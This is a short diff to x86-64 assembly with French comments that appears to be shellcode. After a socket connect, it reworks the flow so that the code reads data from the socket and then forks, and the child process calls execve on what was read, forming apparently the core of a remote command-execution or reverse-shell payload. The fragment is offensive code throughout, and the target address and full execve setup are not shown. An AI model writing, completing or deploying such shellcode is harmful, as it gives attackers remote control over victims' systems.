@@ -47,21 +47,7 @@ _connect:
         mov al, 42
         syscall
 
-; ---- (57) sys_fork ----
-;_fork:
-;	;mov rdi, rax			; on récupère le socket
-;	mov al, 57			; sys_fork
-;	syscall
-;	
-;	cmp rax, 0			; compare if in child process
-;	
-;	jz _readexec			; jmp in child process sys_read and sys_execve
-;		
-;	jmp _connect			; jmp in parent sys_connect
-;
-
-
-_readexec:
+_read:
 ; ----- (0) sys_read (unsigned int fd, char *buf, size_t count) -----
 	xor rax, rax
 	xor rdi, rdi
@@ -80,8 +66,21 @@ _readexec:
 	syscall
 
 	mov r12, [rsi]
-	
+
+
+; ---- (57) sys_fork ----
+_fork:
+	;mov rdi, rax			; on récupère le socket
+	mov al, 57			; sys_fork
+	syscall
+
+	cmp rax, 0			; compare if in child process
+	jz _execve			; jmp in child process sys_read and sys_execve if in child process
+
+	jmp _read			; jmp in parent sys_connect if i parent process
+
 ; ----- (59) execve (const char *filename, const char *const argv[], const char *const envp[])-----
+_execve:
 	xor rax, rax
         xor rbx, rbx
         xor rcx, rcx
